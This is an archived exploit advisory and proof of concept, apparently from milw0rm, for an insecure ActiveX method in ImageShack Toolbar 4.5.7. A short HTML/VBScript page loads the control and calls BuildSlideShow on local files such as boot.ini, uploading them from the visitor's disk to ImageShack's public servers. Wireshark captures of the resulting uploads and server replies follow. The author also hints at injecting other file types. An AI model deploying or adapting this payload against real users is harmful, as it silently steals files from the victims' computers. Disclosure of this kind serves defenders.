<html><head><title>ImageShack Toolbar 4.5.7 FileUploader Class Insecure
Method PoC</title></head><pre>&lt;!--
ImageShack Toolbar 4.5.7 FileUploader Class (ImageShackToolbar.dll) insecure
method poc

This tool may allow a malicious web page to post arbitrary images on the web
from a user hard drive. Images will be visible on ImageShack site, a way for an
attacker to retrieve them maybe tag search or by understanding the renaming
operation, ex. &quot;_&quot; chars are removed and the &quot;tq2&quot; string is appended.
My test image is still visible here:
http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg
Note that a file with a non-image extension can cross the network, Imageshack
server replies with an error message, however this needs further investigation
that I let you to do, ex. with custom packet fields injection.

I suggest users to uninstall it temporarily an just use the site functionalities

Object safety report:

RegKey Safe for Script: True
RegKey Safe for Init: True
Implements IObjectSafety: True
IDisp Safe:  Safe for untrusted: caller

rgod-tsid-pa-he-ru-ka
-
stay tuned with us ...
http://retrogod.altervista.org/join.html
security feeds, radio streams, techno/drum &amp; bass stations to come
--&gt;

&lt;html&gt;
&lt;body&gt;
&lt;object classid='clsid:BDF9442E-9B03-42C2-87BA-2A459B0A5317' id='suntzu' /&gt;&lt;/object&gt;
&lt;script language='vbscript'&gt;
suntzu.BuildSlideShow &quot;file:///c:\\xp_wallpaper_glass.jpg&quot;,&quot;Big&quot;,1,&quot;uhuhinterestingprivatethings&quot;,&quot;Fade&quot;,&quot;White&quot;
suntzu.BuildSlideShow &quot;file:///c:\\boot.ini&quot;, &quot;Big&quot;,1,&quot;uhuhinterestingprivatethings&quot;,&quot;Fade&quot;,&quot;White&quot;
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

----

some wireshark's dump samples:

POST /upload_api.php HTTP/1.1
Content-Type: multipart/form-data, boundary=B-O-U-N-D-A-R-Y731553141
Content-Length: 21755
User-Agent: ImageShack Toolbar 4.5.7 ([..])
Host: load9.imageshack.us
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: imgshck=[..]; un_cookie=1; latest=img404; flashInstalled=9.0; __qca=[..]; rem_bar=1; nopopunder=1

--B-O-U-N-D-A-R-Y731553141
Content-Disposition: form-data; name=&quot;toolbar&quot;

IEImageShackToolbar-4.5.7.69
--B-O-U-N-D-A-R-Y731553141
Content-Disposition: form-data; name=&quot;public&quot;

yes
--B-O-U-N-D-A-R-Y731553141
Content-Disposition: form-data; name=&quot;xml&quot;

newformat
--B-O-U-N-D-A-R-Y731553141
Content-Disposition: form-data; name=&quot;tags&quot;

uhuhinterestingprivatethings
--B-O-U-N-D-A-R-Y731553141
Content-Disposition: form-data; name=&quot;rembar&quot;

1
--B-O-U-N-D-A-R-Y731553141
Content-Disposition: form-data; name=&quot;fileupload&quot;; filename=&quot;xp_wallpaper_glass.jpg&quot;
Content-Type: image/jpeg
Content-Transfer-Encoding: binary

[file content]
--B-O-U-N-D-A-R-Y731553141
Content-Disposition: form-data; name=&quot;thumbupload&quot;; filename=&quot;xp_wallpaper_glass6fa1f1.jpg&quot;
Content-Type: image/jpeg
Content-Transfer-Encoding: binary

[file content]
--B-O-U-N-D-A-R-Y731553141
Content-Disposition: form-data; name=&quot;class&quot;

s
--B-O-U-N-D-A-R-Y731553141--


reply:

HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
X-Powered-By: PHP/5.1.2
Set-Cookie: latest=img262; expires=Sun, 18-Jan-2009 07:56:24 GMT; path=/; domain=.imageshack.us
Set-Cookie: PHPSESSID=[..]; path=/
Set-Cookie: always_opt=-1; path=/; domain=.imageshack.us
Set-Cookie: rem_bar=1; expires=Sun, 18-Jan-2009 07:56:24 GMT; path=/; domain=.imageshack.us
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Content-type: text/xml
Pragma: public
Cache-Control: must-revalidate, post-check=0, pre-check=0
Date: Thu, 24 Jan 2008 07:56:25 GMT
Server: lighttpd/1.4.8

&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;imginfo xmlns=&quot;http//ns.imageshack.us/imginfo/6/&quot; version=&quot;6&quot; timestamp=&quot;1201161385&quot;&gt;
  &lt;rating&gt;
    &lt;ratings&gt;0&lt;/ratings&gt;
    &lt;avg&gt;0.0&lt;/avg&gt;
  &lt;/rating&gt;
  &lt;files server=&quot;262&quot; bucket=&quot;7959&quot;&gt;
     &lt;image size=&quot;16646&quot; content-type=&quot;image/jpeg&quot;&gt;xpwallpaperglasstq2.jpg&lt;/image&gt;
     &lt;thumb size=&quot;3155&quot; content-type=&quot;image/jpeg&quot;&gt;xpwallpaperglasstq2.th.jpg&lt;/thumb&gt;
  &lt;/files&gt;
  &lt;resolution&gt;
    &lt;width&gt;426&lt;/width&gt;
    &lt;height&gt;320&lt;/height&gt;
  &lt;/resolution&gt;
  &lt;class&gt;s&lt;/class&gt;
  &lt;uploader&gt;
    &lt;ip&gt;87.11.97.155&lt;/ip&gt;
  &lt;/uploader&gt;
  &lt;links&gt;
    &lt;image_link&gt;http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.jpg&lt;/image_link&gt;
    &lt;image_html&gt;&amp;lt;a href=&amp;quot;http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg&amp;quot; target=&amp;quot;_blank&amp;quot;&amp;gt;&amp;lt;img src=&amp;quot;http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.jpg&amp;quot; alt=&amp;quot;Free Image Hosting at www.ImageShack.us&amp;quot; border=&amp;quot;0&amp;quot;/&amp;gt;&amp;lt;/a&amp;gt;&lt;/image_html&gt;
    &lt;image_bb&gt;[URL=http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg][IMG]http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.jpg[/IMG][/URL]&lt;/image_bb&gt;
    &lt;image_bb2&gt;[url=http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg][img=http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.jpg][/url]&lt;/image_bb2&gt;
    &lt;thumb_link&gt;http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.th.jpg&lt;/thumb_link&gt;
    &lt;thumb_html&gt;&amp;lt;a href=&amp;quot;http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg&amp;quot; target=&amp;quot;_blank&amp;quot;&amp;gt;&amp;lt;img src=&amp;quot;http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.th.jpg&amp;quot; alt=&amp;quot;Free Image Hosting at www.ImageShack.us&amp;quot; border=&amp;quot;0&amp;quot;/&amp;gt;&amp;lt;/a&amp;gt;&lt;/thumb_html&gt;
    &lt;thumb_bb&gt;[URL=http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg][IMG]http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.th.jpg[/IMG][/URL]&lt;/thumb_bb&gt;
    &lt;thumb_bb2&gt;[url=http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg][img=http://img262.imageshack.us/img262/7959/xpwallpaperglasstq2.th.jpg][/url]&lt;/thumb_bb2&gt;
    &lt;ad_link&gt;http://img262.imageshack.us/my.php?image=xpwallpaperglasstq2.jpg&lt;/ad_link&gt;
    &lt;done_page&gt;http://img262.imageshack.us/content.php?page=done&amp;amp;l=img262/7959/xpwallpaperglasstq2.jpg&lt;/done_page&gt;
  &lt;/links&gt;
&lt;/imginfo&gt;

with the boot.ini file:

POST /upload_api.php HTTP/1.1
Content-Type: multipart/form-data, boundary=B-O-U-N-D-A-R-Y732118720442
Content-Length: 1077
User-Agent: ImageShack Toolbar 4.5.7 (WinNT 5.1 Service Pack 2)
Host: load10.imageshack.us
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: imgshck=[..]; un_cookie=1; latest=img214; flashInstalled=9.0; __qca=[..]; rem_bar=1; nopopunder=1; always_opt=-1

--B-O-U-N-D-A-R-Y732118720442
Content-Disposition: form-data; name=&quot;toolbar&quot;

IEImageShackToolbar-4.5.7.69
--B-O-U-N-D-A-R-Y732118720442
Content-Disposition: form-data; name=&quot;public&quot;

yes
--B-O-U-N-D-A-R-Y732118720442
Content-Disposition: form-data; name=&quot;xml&quot;

newformat
--B-O-U-N-D-A-R-Y732118720442
Content-Disposition: form-data; name=&quot;tags&quot;

uhuhinterestingprivatethings
--B-O-U-N-D-A-R-Y732118720442
Content-Disposition: form-data; name=&quot;rembar&quot;

1
--B-O-U-N-D-A-R-Y732118720442
Content-Disposition: form-data; name=&quot;fileupload&quot;; filename=&quot;boot.ini&quot;
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Home Edition&quot; / fastdetect /NoExecute=OptIn
--B-O-U-N-D-A-R-Y732118720442
Content-Disposition: form-data; name=&quot;class&quot;

s
--B-O-U-N-D-A-R-Y732118720442--

reply:

HTTP/1.1 200 OK
Transfer-Encoding: chunked
X-Powered-By: PHP/5.1.2
Content-Type: text/xml
Set-Cookie: latest=img89; expires=Sun, 18-Jan-2009 07:56:28 GMT; path=/; domain=.imageshack.us
Date: Thu, 24 Jan 2008 07:56:28 GMT
Server: lighttpd/1.4.18

&lt;links&gt;
&lt;error id=&quot;wrong_file_type&quot;&gt;Wrong file type detected for file boot.ini:application/octet-stream&lt;/error&gt;
&lt;/links&gt;

# milw0rm.com [2008-01-24]</pre></html>